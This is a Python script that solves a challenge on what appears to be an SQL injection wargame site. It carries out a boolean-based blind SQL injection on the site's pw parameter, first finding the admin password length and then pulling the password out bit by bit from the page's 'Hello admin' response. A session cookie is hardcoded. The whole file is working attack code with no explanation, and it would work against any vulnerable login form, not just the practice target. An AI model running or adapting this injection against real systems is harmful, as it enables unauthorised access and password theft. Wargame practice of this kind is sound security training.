import requests
url="https://los.rubiya.kr/chall/xavis_04f071ecdadb4296361d2101e4a2c390.php"
header={"Cookie":"PHPSESSID=66coe5kbn0k94vtl3spqgd5ko0"}
sess=requests.session()

payload="?pw=' or id='admin' and length(pw)="
for i in range(1,100):
    pay=url+payload+str(i)+"%23"
    x=sess.get(pay,headers=header)
    print("Check:",i,end=" ")
    
    if "Hello admin" in x.text:
        length=i
        break
    else:
        print("Fail")
print("Success\nlength:",length)


payload="?pw=' or id='admin' and "
password=''
for i in range(1,length+1):
    bits=''
    print("check:",i,end="")
    for j in range(1,length+1):
        pay=url+payload+"MID(lpad(bin(conv(hex(MID(pw,"+str(i)+",1)),16,10)),32,0),"+str(j)+",1)=1%23"
        x=sess.get(pay,headers=header)
        
        if "Hello admin" in x.text:
            bits+='1'
        else:
            bits+='0'
    print(bits)
    password+=''.join(chr(int(bits, 2)))
    print("\t",chr(int(bits,2)))
print("Password:"+password)



